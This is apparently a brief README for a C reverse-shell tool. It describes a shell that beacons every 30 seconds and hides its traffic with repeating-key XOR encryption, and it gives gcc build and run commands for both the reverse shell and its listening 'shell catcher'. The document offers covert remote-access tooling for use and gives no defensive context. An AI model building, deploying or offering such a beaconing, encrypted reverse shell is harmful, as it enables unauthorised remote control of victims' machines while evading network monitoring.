# Repeating key XOR reverse shell

The reverse shell attempts to make a connection every 30 seconds.
Traffic is encrypted with the key provided.

## Useage

### Reverse Shell
```
gcc -o rev.bin reverse-shell.c
./rev.bin 127.0.0.1 58008 mysecretpassword
```

### Shell Catcher
```
gcc -o server ./server.c
./server 58008 mysecretpassword 
```
